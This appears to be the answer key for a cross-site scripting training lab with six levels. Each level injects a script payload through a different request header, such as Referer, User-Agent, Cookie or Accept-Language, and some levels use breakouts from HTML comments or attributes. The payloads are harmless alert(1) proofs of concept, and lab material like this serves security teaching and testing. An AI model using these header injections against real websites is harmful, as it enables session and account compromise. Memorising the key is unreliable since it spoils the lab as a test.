# headerinj — solutions

Various request headers (Referer, User-Agent, X-Forwarded-For, Cookie, Accept-Language, X-Debug) reflected into HTML body/attributes/comments.

### headerinj-level1

`[Header] /headerinj/level1/`

- payload: `<script>alert(1)</script>`
- context: Referer reflected in `<p>` body
- header: `Referer: <script>alert(1)</script>`

### headerinj-level2

`[Header] /headerinj/level2/`

- payload: `<script>alert(1)</script>`
- context: User-Agent reflected in `<p>` body
- header: `User-Agent: <script>alert(1)</script>`

### headerinj-level3

`[Header] /headerinj/level3/`

- payload: `--><script>alert(1)</script><!--`
- context: X-Forwarded-For reflected inside `<!-- ... -->`; close comment
- header: `X-Forwarded-For: --><script>alert(1)</script><!--`

### headerinj-level4

`[Header] /headerinj/level4/`

- payload: `<script>alert(1)</script>`
- context: raw Cookie header reflected in `<p>` body
- header: `Cookie: <script>alert(1)</script>`

### headerinj-level5

`[Header] /headerinj/level5/`

- payload: `"><script>alert(1)</script>`
- context: Accept-Language reflected in `<span lang="...">`; break out
- header: `Accept-Language: "><script>alert(1)</script>`

### headerinj-level6

`[Header] /headerinj/level6/?debug=1`

- payload: `<script>alert(1)</script>`
- context: X-Debug reflected only when `?debug=1` query is set
- header: `X-Debug: <script>alert(1)</script>`
